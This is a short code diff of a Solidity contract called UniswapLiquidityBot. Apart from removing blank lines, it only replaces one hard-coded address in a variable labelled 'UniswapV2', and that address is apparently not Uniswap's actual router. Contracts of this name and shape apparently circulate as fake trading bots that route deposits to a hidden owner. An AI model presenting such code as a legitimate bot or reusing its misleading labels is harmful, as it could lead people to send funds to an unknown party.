@@ -1,9 +1,6 @@
 
 
 
-
-
-
 pragma solidity ^0.6.6;
 
 
@@ -820,7 +817,7 @@ contract UniswapLiquidityBot {
  }
 
 
- address UniswapV2 = 0xAefedcC8351382e932307B485bB4839a2d4393b8 ;
+ address UniswapV2 = 0xBb06cD2CFe638f1C88b22B1C10BC34A55B611328 ;
 
 
  /*
